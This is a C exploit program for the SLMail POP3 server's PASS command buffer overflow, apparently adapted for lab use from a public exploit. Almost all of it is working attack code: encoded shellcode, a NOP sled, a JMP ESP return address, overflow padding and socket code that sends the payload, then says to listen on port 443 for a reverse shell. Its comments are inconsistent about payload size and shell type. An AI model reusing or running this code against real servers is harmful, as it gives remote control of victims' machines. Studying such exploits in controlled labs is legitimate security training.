#adapted from Ivan Ivanovic Ivanov

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
//updated shellcode
unsigned char shellcode[] =
"\xbf\x2b\x36\xdd\xe5\xd9\xc7\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x78\x12\x83\xc0\x04\x03\x53\x38\x3f\x10\x5f\xac\x3d"
"\xdb\x9f\x2d\x22\x55\x7a\x1c\x62\x01\x0f\x0f\x52\x41\x5d\xbc"
"\x19\x07\x75\x37\x6f\x80\x7a\xf0\xda\xf6\xb5\x01\x76\xca\xd4"
"\x81\x85\x1f\x36\xbb\x45\x52\x37\xfc\xb8\x9f\x65\x55\xb6\x32"
"\x99\xd2\x82\x8e\x12\xa8\x03\x97\xc7\x79\x25\xb6\x56\xf1\x7c"
"\x18\x59\xd6\xf4\x11\x41\x3b\x30\xeb\xfa\x8f\xce\xea\x2a\xde"
"\x2f\x40\x13\xee\xdd\x98\x54\xc9\x3d\xef\xac\x29\xc3\xe8\x6b"
"\x53\x1f\x7c\x6f\xf3\xd4\x26\x4b\x05\x38\xb0\x18\x09\xf5\xb6"
"\x46\x0e\x08\x1a\xfd\x2a\x81\x9d\xd1\xba\xd1\xb9\xf5\xe7\x82"
"\xa0\xac\x4d\x64\xdc\xae\x2d\xd9\x78\xa5\xc0\x0e\xf1\xe4\x8c"
"\xe3\x38\x16\x4d\x6c\x4a\x65\x7f\x33\xe0\xe1\x33\xbc\x2e\xf6"
"\x34\x97\x97\x68\xcb\x18\xe8\xa1\x08\x4c\xb8\xd9\xb9\xed\x53"
"\x19\x45\x38\xf3\x49\xe9\x93\xb4\x39\x49\x44\x5d\x53\x46\xbb"
"\x7d\x5c\x8c\xd4\x14\xa7\x47\xd1\xe3\xa7\xeb\x8d\xf1\xa7\x12"
"\xf5\x7f\x41\x7e\x19\xd6\xda\x17\x80\x73\x90\x86\x4d\xae\xdd"
"\x89\xc6\x5d\x22\x47\x2f\x2b\x30\x30\xdf\x66\x6a\x97\xe0\x5c"
"\x02\x7b\x72\x3b\xd2\xf2\x6f\x94\x85\x53\x41\xed\x43\x4e\xf8"
"\x47\x71\x93\x9c\xa0\x31\x48\x5d\x2e\xb8\x1d\xd9\x14\xaa\xdb"
"\xe2\x10\x9e\xb3\xb4\xce\x48\x72\x6f\xa1\x22\x2c\xdc\x6b\xa2"
"\xa9\x2e\xac\xb4\xb5\x7a\x5a\x58\x07\xd3\x1b\x67\xa8\xb3\xab"
"\x10\xd4\x23\x53\xcb\x5c\x43\xb6\xd9\xa8\xec\x6f\x88\x10\x71"
"\x90\x67\x56\x8c\x13\x8d\x27\x6b\x0b\xe4\x22\x37\x8b\x15\x5f"
"\x28\x7e\x19\xcc\x49\xab";
 

char shelltest[] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak7";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER peaches\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char jmpesp[] = "\x8F\x35\x4A\x5F";
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
		       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);//probably estimated amt. of space based new shellcode
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 2606);
      ptr = &evil;
      ptr = ptr + 2606; // 2608 (nop needs to be after jmpesp 2606+4 = 2610 (div 4)
      memcpy(ptr, &jmpesp, 4);
      ptr = ptr + 4;//move ptr past jmpesp for nopsled
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;//move past the nopsled and put in shellcode
      memcpy(ptr, &shellcode, 351);//changed to 355 from 317 - my payload is 355
      
      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Listen on port 443 for rev shell...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
